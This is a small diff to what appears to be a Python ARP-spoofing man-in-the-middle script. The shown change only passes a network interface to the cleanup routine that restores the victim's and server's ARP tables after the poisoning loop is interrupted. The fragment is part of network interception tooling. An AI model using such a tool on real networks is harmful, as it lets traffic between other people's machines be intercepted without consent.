@@ -50,10 +50,10 @@ def MIMspoofARP(ipVictim, ipServer):
             time.sleep(2)
     except KeyboardInterrupt:
         print("Undoing ARP poisoning")
-        undoARPSpoof(ipVictim, ipServer, macVictim, macServer, macAttacker)
+        undoARPSpoof(ipVictim, ipServer, macVictim, macServer, macAttacker, interface)
 
 
-def undoARPSpoof(ipVictim, ipServer, macVictim, macServer, macAttacker):
+def undoARPSpoof(ipVictim, ipServer, macVictim, macServer, macAttacker, interface):
     undoVictim = Ether(src = macAttacker) / ARP(hwsrc=macVictim, psrc=ipVictim, hwdst=macServer, pdst=ipServer)
     undoServer = Ether(src = macAttacker) / ARP(hwdst=macVictim, pdst=ipVictim, hwsrc=macServer, psrc=ipServer)
 
